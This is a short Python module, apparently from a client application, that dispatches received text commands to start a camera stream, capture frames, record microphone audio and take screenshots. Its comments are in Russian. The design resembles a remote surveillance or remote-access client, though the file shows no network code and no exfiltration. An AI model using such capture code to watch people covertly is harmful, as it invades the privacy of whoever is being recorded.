from clientV2.core.services.logger_service import LoggerService
from clientV2.adapters.devices import camera_adapter, microphone_adapter, screenshot_adapter

def process_command(command: str, logger: LoggerService):
    cmd = command.lower().strip()
    logger.info(f"Processing command: {cmd}")
    
    if cmd == "start_camera":
        camera_adapter.start_camera_stream()
    elif cmd == "stop_camera":
        camera_adapter.stop_camera_stream()
    elif cmd == "capture_frame":
        # Новая команда для одиночного захвата кадра
        frame = camera_adapter.capture_frame()
        if frame:
            logger.info("Single frame captured successfully.")
            # Здесь можно добавить отправку кадра через коммуникационный адаптер
        else:
            logger.error("Failed to capture a single frame.")
    elif cmd == "record_audio":
        audio_data = microphone_adapter.record_audio(duration=5)
        if audio_data:
            logger.info("Audio recorded successfully.")
            # Дополнительная обработка аудиоданных
        else:
            logger.error("Audio recording failed.")
    elif cmd == "screenshot":
        img_bytes = screenshot_adapter.take_screenshot()
        if img_bytes:
            logger.info("Screenshot taken successfully.")
            # Дополнительная обработка скриншота
        else:
            logger.error("Failed to take screenshot.")
    else:
        logger.info(f"Unknown command received: {command}")
